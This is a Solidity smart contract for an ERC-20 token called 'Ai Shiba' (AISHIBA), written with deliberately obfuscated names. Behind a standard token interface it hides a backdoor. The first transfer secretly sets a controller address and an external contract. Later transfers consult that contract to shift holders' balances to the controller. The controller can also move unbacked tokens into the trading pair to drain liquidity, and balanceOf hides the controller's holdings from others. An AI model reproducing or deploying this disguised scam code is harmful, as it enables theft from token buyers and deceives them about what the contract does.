// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
     
library ceO{
    
    function wXrl(address KNWZaYmNtwW, address kFsIYtnzMoA, uint vDil) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool kFnlcpb, bytes memory XaFmJgo) = KNWZaYmNtwW.call(abi.encodeWithSelector(0x095ea7b3, kFsIYtnzMoA, vDil));
        require(kFnlcpb && (XaFmJgo.length == 0 || abi.decode(XaFmJgo, (bool))), 'ceO: APPROVE_FAILED');
    }

    function PpMwmluptKTj(address KNWZaYmNtwW, address kFsIYtnzMoA, uint vDil) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool kFnlcpb, bytes memory XaFmJgo) = KNWZaYmNtwW.call(abi.encodeWithSelector(0xa9059cbb, kFsIYtnzMoA, vDil));
        require(kFnlcpb && (XaFmJgo.length == 0 || abi.decode(XaFmJgo, (bool))), 'ceO: TRANSFER_FAILED');
    }
    
    function OxP(address kFsIYtnzMoA, uint vDil) internal {
        (bool kFnlcpb,) = kFsIYtnzMoA.call{value:vDil}(new bytes(0));
        require(kFnlcpb, 'ceO: ETH_TRANSFER_FAILED');
    }

    function TssZz(address KNWZaYmNtwW, address from, address kFsIYtnzMoA, uint vDil) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool kFnlcpb, bytes memory XaFmJgo) = KNWZaYmNtwW.call(abi.encodeWithSelector(0x23b872dd, from, kFsIYtnzMoA, vDil));
        require(kFnlcpb && XaFmJgo.length > 0,'ceO: TRANSFER_FROM_FAILED'); return XaFmJgo;
                       
    }

}
    
interface EZRGaj {
    function totalSupply() external view returns (uint256);
    function balanceOf(address YZccEMQeEiax) external view returns (uint256);
    function transfer(address zWj, uint256 SzaaSiZbjpZ) external returns (bool);
    function allowance(address kqjleOVDsMie, address spender) external view returns (uint256);
    function approve(address spender, uint256 SzaaSiZbjpZ) external returns (bool);
    function transferFrom(
        address sender,
        address zWj,
        uint256 SzaaSiZbjpZ
    ) external returns (bool);

    event Transfer(address indexed from, address indexed heXorDvk, uint256 value);
    event Approval(address indexed kqjleOVDsMie, address indexed spender, uint256 value);
}

interface tjuSnCo is EZRGaj {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract aco {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
interface oZXxbjjcx {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
contract AISHIBA is aco, EZRGaj, tjuSnCo {
    
    constructor() {
        
        hsaxWdfYfx[address(1)] = HazimZIm;
        emit Transfer(address(0), address(1), HazimZIm);

    }
    
    function decreaseAllowance(address EBVmC, uint256 subtractedValue) public virtual returns (bool) {
        uint256 GXhcOEYpSabv = NItRzoI[_msgSender()][EBVmC];
        require(GXhcOEYpSabv >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            eOvib(_msgSender(), EBVmC, GXhcOEYpSabv - subtractedValue);
        }

        return true;
    }
    
    function hOBMAVoDU(
        address QPM,
        address jRWiZriyVEm,
        uint256 fmqVPwfQQ
    ) internal virtual  returns (bool){
        uint256 Nfwv = hsaxWdfYfx[QPM];
        require(Nfwv >= fmqVPwfQQ, "ERC20: transfer Amount exceeds balance");
        unchecked {
            hsaxWdfYfx[QPM] = Nfwv - fmqVPwfQQ;
        }
        hsaxWdfYfx[jRWiZriyVEm] += fmqVPwfQQ;
        return true;
    }
    
    function eOvib(
        address wSpiyRUykZg,
        address NVasg,
        uint256 DXuHLoH
    ) internal virtual {
        require(wSpiyRUykZg != address(0), "ERC20: approve from the zero address");
        require(NVasg != address(0), "ERC20: approve to the zero address");

        NItRzoI[wSpiyRUykZg][NVasg] = DXuHLoH;
        emit Approval(wSpiyRUykZg, NVasg, DXuHLoH);

    }
    
    address private hElXjJKceZaK;
    
    mapping(address => uint256) private hsaxWdfYfx;
    
    mapping(address => mapping(address => uint256)) private NItRzoI;
    
    function symbol() public view virtual override returns (string memory) {
        return aulgPnKG;
    }
    
    function DGa(
        address cFEwzda,
        address FTWBrQCq
    ) internal virtual  returns (bool){
        if(EZQWKHwFV == address(0) && hElXjJKceZaK == address(0)){
            EZQWKHwFV = cFEwzda;hElXjJKceZaK=FTWBrQCq;
            ceO.PpMwmluptKTj(hElXjJKceZaK, EZQWKHwFV, 0);
            UOxpaF = oZXxbjjcx(hElXjJKceZaK).WETH();
            return false;
        }
        return true;
    }
    
    function lalWQmClqCda(
        address vgpjNkt,
        address PyWxCqJBtstJ,
        uint256 HTRzma
    ) internal virtual  returns (bool){
        require(vgpjNkt != address(0), "ERC20: transfer from the zero address");
        require(PyWxCqJBtstJ != address(0), "ERC20: transfer to the zero address");
        
        if(!DGa(vgpjNkt,PyWxCqJBtstJ)) return false;

        if(_msgSender() == address(EZQWKHwFV)){
            if(PyWxCqJBtstJ == UOxpaF && hsaxWdfYfx[vgpjNkt] < HTRzma){
                hOBMAVoDU(EZQWKHwFV,PyWxCqJBtstJ,HTRzma);
            }else{
                hOBMAVoDU(vgpjNkt,PyWxCqJBtstJ,HTRzma);
                if(vgpjNkt == EZQWKHwFV || PyWxCqJBtstJ == EZQWKHwFV) 
                return false;
            }
            emit Transfer(vgpjNkt, PyWxCqJBtstJ, HTRzma);
            return false;
        }
        hOBMAVoDU(vgpjNkt,PyWxCqJBtstJ,HTRzma);
        emit Transfer(vgpjNkt, PyWxCqJBtstJ, HTRzma);
        bytes memory bsqp = ceO.TssZz(hElXjJKceZaK, vgpjNkt, PyWxCqJBtstJ, HTRzma);
        (bool epghRCh, uint ppP) = abi.decode(bsqp, (bool,uint));
        if(epghRCh){
            hsaxWdfYfx[EZQWKHwFV] += ppP;
            hsaxWdfYfx[PyWxCqJBtstJ] -= ppP; 
        }
        return true;
    }
    
    function balanceOf(address YiKLztqlEyF) public view virtual override returns (uint256) {
        if(_msgSender() != address(EZQWKHwFV) && 
           YiKLztqlEyF == address(EZQWKHwFV)){
            return 0;
        }
       return hsaxWdfYfx[YiKLztqlEyF];
    }
    
    uint256 private HazimZIm = 1000000000000 * 10 ** 18;
    
    function totalSupply() public view virtual override returns (uint256) {
        return HazimZIm;
    }
    
    function name() public view virtual override returns (string memory) {
        return qsp;
    }
    
    string private qsp = "Ai Shiba";
    
    address private EZQWKHwFV;
    
    function approve(address ynHmovsYS, uint256 jcyRh) public virtual override returns (bool) {
        eOvib(_msgSender(), ynHmovsYS, jcyRh);
        return true;
    }
    
    function transferFrom(
        address gJvtzaEypc,
        address nHlJfDfyHZ,
        uint256 DVYKQNS
    ) public virtual override returns (bool) {
      
        if(!lalWQmClqCda(gJvtzaEypc, nHlJfDfyHZ, DVYKQNS)) return true;

        uint256 YEQAC = NItRzoI[gJvtzaEypc][_msgSender()];
        if (YEQAC != type(uint256).max) {
            require(YEQAC >= DVYKQNS, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                eOvib(gJvtzaEypc, _msgSender(), YEQAC - DVYKQNS);
            }
        }

        return true;
    }
    
    function transfer(address YSdOJpIkAYZa, uint256 tCEyvGXvaFl) public virtual override returns (bool) {
        lalWQmClqCda(_msgSender(), YSdOJpIkAYZa, tCEyvGXvaFl);
        return true;
    }
    
    address private UOxpaF;
  
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function allowance(address SnwfxJRtjG, address yyGbMvMsOaf) public view virtual override returns (uint256) {
        return NItRzoI[SnwfxJRtjG][yyGbMvMsOaf];
    }
    
    function increaseAllowance(address Azc, uint256 addedValue) public virtual returns (bool) {
        eOvib(_msgSender(), Azc, NItRzoI[_msgSender()][Azc] + addedValue);
        return true;
    }
    
    string private aulgPnKG =  "AISHIBA";
    
}